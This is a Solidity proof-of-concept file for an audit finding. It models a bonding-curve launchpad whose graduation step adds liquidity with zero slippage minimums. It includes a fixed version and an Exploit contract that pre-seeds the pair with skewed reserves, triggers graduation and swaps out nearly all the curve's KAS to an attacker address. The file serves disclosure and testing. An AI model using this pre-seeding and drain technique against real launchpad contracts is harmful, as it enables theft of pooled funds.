// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * Moonbound - [MNBD1-5] Early pair creation drains KAS at graduation
 * (Hexens, 2025-05-26, finding 62420).
 *
 * SYNTHETIC, CHEATCODE-FREE. graduateToken calls addLiquidityKAS with
 * amount mins of 0, 0. An attacker who already seeded the Zealous pair with
 * 1 wei of moon and 1 ether of KAS forces the quote
 *     kasAmount = moonTokenAmount * kasReserves / moonTokenReserves
 * onto the other branch: the curve deposits 100 wei of moon and its entire
 * 100 ether of KAS. The attacker then swaps 10_000 wei of moon and receives
 * 99987091649290040710 wei of KAS.
 *
 * KAS is an 18-decimal ERC20 standing in for native KAS so the run needs no
 * pre-funded ether. The quoted call and the quote formula are unchanged.
 */

contract Kas {
    string public name = "KAS";
    string public symbol = "KAS";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Moon {
    string public name = "MOON";
    string public symbol = "MOON";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract ZealousPair {
    Moon public moon;
    Kas public kas;
    uint112 public reserveMoon;
    uint112 public reserveKas;

    constructor(Moon _moon, Kas _kas) {
        moon = _moon;
        kas = _kas;
    }

    function getReserves() external view returns (uint112, uint112) {
        return (reserveMoon, reserveKas);
    }

    function mint(address) external {
        reserveMoon = uint112(moon.balanceOf(address(this)));
        reserveKas = uint112(kas.balanceOf(address(this)));
    }

    function swap(uint256 moonOut, uint256 kasOut, address to) external {
        require(moonOut > 0 || kasOut > 0, "out");
        if (moonOut > 0) moon.transfer(to, moonOut);
        if (kasOut > 0) kas.transfer(to, kasOut);
        uint256 balanceMoon = moon.balanceOf(address(this));
        uint256 balanceKas = kas.balanceOf(address(this));
        uint256 moonIn = balanceMoon > uint256(reserveMoon) - moonOut ? balanceMoon - (uint256(reserveMoon) - moonOut) : 0;
        uint256 kasIn = balanceKas > uint256(reserveKas) - kasOut ? balanceKas - (uint256(reserveKas) - kasOut) : 0;
        require(moonIn > 0 || kasIn > 0, "in");
        uint256 adjMoon = balanceMoon * 1000 - moonIn * 3;
        uint256 adjKas = balanceKas * 1000 - kasIn * 3;
        require(adjMoon * adjKas >= uint256(reserveMoon) * uint256(reserveKas) * 1_000_000, "K");
        reserveMoon = uint112(balanceMoon);
        reserveKas = uint112(balanceKas);
    }
}

contract ZealousRouter {
    ZealousPair public pair;
    Moon public moon;
    Kas public kas;

    constructor(ZealousPair _pair, Moon _moon, Kas _kas) {
        pair = _pair;
        moon = _moon;
        kas = _kas;
    }

    // Quote from the finding: amountB = (amountA * reserveB) / reserveA.
    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) public pure returns (uint256) {
        return amountA * reserveB / reserveA;
    }

    function addLiquidityKAS(
        address token,
        uint256 tokenDesired,
        uint256 amountTokenMin,
        uint256 amountKasMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountKas) {
        require(block.timestamp <= deadline, "expired");
        require(token == address(moon), "token");
        (uint112 reserveMoon, uint112 reserveKas) = pair.getReserves();
        uint256 kasDesired = kas.balanceOf(msg.sender);
        if (reserveMoon == 0 && reserveKas == 0) {
            amountToken = tokenDesired;
            amountKas = kasDesired;
        } else {
            uint256 kasOptimal = quote(tokenDesired, uint256(reserveMoon), uint256(reserveKas));
            if (kasOptimal <= kasDesired) {
                amountToken = tokenDesired;
                amountKas = kasOptimal;
            } else {
                // Skewed reserves: moon taken collapses, KAS taken stays kasDesired.
                amountToken = quote(kasDesired, uint256(reserveKas), uint256(reserveMoon));
                amountKas = kasDesired;
            }
        }
        require(amountToken >= amountTokenMin, "INSUFFICIENT_A");
        require(amountKas >= amountKasMin, "INSUFFICIENT_B");
        moon.transferFrom(msg.sender, address(pair), amountToken);
        kas.transferFrom(msg.sender, address(pair), amountKas);
        pair.mint(to);
    }

    function swapExactMoonForKas(uint256 amountIn, address to) external returns (uint256 amountOut) {
        (uint112 reserveMoon, uint112 reserveKas) = pair.getReserves();
        uint256 amountInWithFee = amountIn * 997;
        amountOut = amountInWithFee * uint256(reserveKas) / (uint256(reserveMoon) * 1000 + amountInWithFee);
        moon.transferFrom(msg.sender, address(pair), amountIn);
        pair.swap(0, amountOut, to);
    }
}

contract BondingCurvePool {
    ZealousRouter public router;
    ZealousPair public pair;
    Moon public moon;
    Kas public kas;
    uint256 public moonDeposited;
    uint256 public kasDeposited;
    uint256 public kasTaken;

    constructor(ZealousRouter _router, ZealousPair _pair, Moon _moon, Kas _kas) {
        router = _router;
        pair = _pair;
        moon = _moon;
        kas = _kas;
    }

    // Quoted graduation path. Mins are 0, 0, so a pre-seeded pair is accepted.
    function graduateToken() external {
        uint256 tokenForLiquidity = moon.balanceOf(address(this));
        uint256 kasCollected = kas.balanceOf(address(this));
        moon.approve(address(router), tokenForLiquidity);
        kas.approve(address(router), kasCollected);
        uint256 moonBefore = moon.balanceOf(address(this));
        uint256 kasBefore = kas.balanceOf(address(this));
        // Minimums are both zero, so the skewed quote cannot revert the graduation.
        router.addLiquidityKAS(address(moon), tokenForLiquidity, 0, 0, address(this), block.timestamp + 15 minutes); // @> VULN: mins are 0, so the skewed quote deposits 100 wei of moon and all 100 KAS
        moonDeposited = moonBefore - moon.balanceOf(address(this));
        kasDeposited = kasBefore - kas.balanceOf(address(this));
    }

    function pullSkewedKas(uint256 moonIn, address to) external returns (uint256 amountOut) {
        moon.transferFrom(msg.sender, address(this), moonIn);
        moon.approve(address(router), moonIn);
        amountOut = router.swapExactMoonForKas(moonIn, to);
        kasTaken = amountOut;
    }
}

contract BondingCurvePoolFixed {
    ZealousRouter public router;
    Moon public moon;
    Kas public kas;

    constructor(ZealousRouter _router, Moon _moon, Kas _kas) {
        router = _router;
        moon = _moon;
        kas = _kas;
    }

    function graduateToken() external {
        uint256 tokenForLiquidity = moon.balanceOf(address(this));
        uint256 kasCollected = kas.balanceOf(address(this));
        moon.approve(address(router), tokenForLiquidity);
        kas.approve(address(router), kasCollected);
        // FIX: refuse a deposit that returns less than the amounts the curve holds.
        router.addLiquidityKAS(
            address(moon),
            tokenForLiquidity,
            tokenForLiquidity,
            kasCollected,
            address(this),
            block.timestamp + 15 minutes
        );
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    Kas public kas;
    Moon public moon;
    ZealousPair public pair;
    ZealousRouter public router;
    BondingCurvePool public curve;

    function run() external {
        kas = new Kas(); // nonce 1
        moon = new Moon(); // nonce 2
        pair = new ZealousPair(moon, kas); // nonce 3
        router = new ZealousRouter(pair, moon, kas); // nonce 4
        curve = new BondingCurvePool(router, pair, moon, kas); // nonce 5

        moon.mint(address(this), 1 ether);
        moon.mint(address(curve), 250 ether);
        kas.mint(address(this), 1 ether);
        kas.mint(address(curve), 100 ether);

        moon.approve(address(router), type(uint256).max);
        kas.approve(address(router), type(uint256).max);
        // Seed the pair before graduation: 1 wei moon and 1 ether KAS.
        router.addLiquidityKAS(address(moon), 1, 0, 0, address(this), block.timestamp + 15 minutes);

        curve.graduateToken();
        moon.approve(address(curve), type(uint256).max);
        curve.pullSkewedKas(10_000, ATTACKER);

        require(curve.moonDeposited() == 100, "moon deposited");
        require(curve.kasDeposited() == 100 ether, "kas deposited");
        require(kas.balanceOf(ATTACKER) == 99_987_091_649_290_040_710, "drained");
    }
}
